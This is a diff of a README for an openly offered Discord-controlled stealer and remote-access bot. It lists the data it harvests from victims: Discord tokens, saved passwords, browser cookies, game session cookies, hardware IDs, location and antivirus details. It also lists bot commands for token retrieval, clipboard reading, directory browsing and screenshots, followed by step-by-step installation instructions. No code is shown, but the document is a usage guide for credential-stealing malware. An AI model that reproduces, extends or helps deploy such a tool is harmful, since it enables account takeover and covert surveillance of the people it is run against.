@@ -10,16 +10,10 @@ Make sure if you have any ideas or issues make a request for help Enjoy!.
         *   Discord Information: User token, password, email
         *   Browser Data: Cookies, Passwords, History
         *   Game Data: Minecraft Session Info, Roblox Cookie, etc.
-        *   System Information: libaries, Tasks
-        *   User: Username
-        *   OS: Operating system details
-        *   System: System Architecture
+        *   System Information: libaries, Tasks Specs, Location, Users, System: System 
+        *   Architecture, Installed Antivirus
         *   Network: Local IP Address, Country, Wifi information
-        *   Mac Address, Hardware ID (HWID)
-        *   PC Specs: System specifications
-        *   Installed Antivirus
-        *   Product Key
-        *   Other Data: Back up codes and general functions
+        *  ,Mac Address, Hardware ID (HWID)
         *   Screenshot: Desktop screenshot
 
 
@@ -39,30 +33,29 @@ Make sure if you have any ideas or issues make a request for help Enjoy!.
           /clear: Clear channel messages.
           /discord_token: Retrieve Discord token.
           /directories: Browse Directories.
-          /restart_explorer: Restarts explorer.exe.
           /Clipboard:  Displays the hosts clipboard
           /screenshot: Take a screenshot.
-          /restart: Restarts the bot.
+          /SytemInfo: Displays user AVS/Vpns Location User
 ```
    ##Installation/Guide📘
         
-   1.  Ensure you have Python . You can download it from [python.org](https://www.python.org/).⬇️
-
-
-   2.  Install the required dependencies using pip:pip install (Selected variable)🟦
+   *1.  Ensure you have Python . You can download it from [python.org](https://www.python.org/).⬇️
+.
+.
+   *2.  Install the required dependencies using pip:pip install (Selected variable)🟦
  ```
   ip install discord.py python-dotenv cryptography pyautogui 
  ```
-   3.  edit the `.env` file and set the `BOT_TOKEN`  text variable with your bot token (discord app bot).📄
+  * 3.  edit the `.env` file and set the `BOT_TOKEN`  text variable with your bot token (discord app bot).📄
  
  
   
-   4: Change the directory to were your file is located (use your directory) 📂
+  * 4: Change the directory to were your file is located (use your directory) 📂
  ```
  cd C:\Users\User\downloads\ItzRealSteale
  ```
 
-   5:Run the code and make sure it dosent have any errors if it dose look at the crash.txtℹ️
+   *5:Run the code and make sure it dosent have any errors if it dose look at the crash.txtℹ️
  ```
 python main.py
 ```
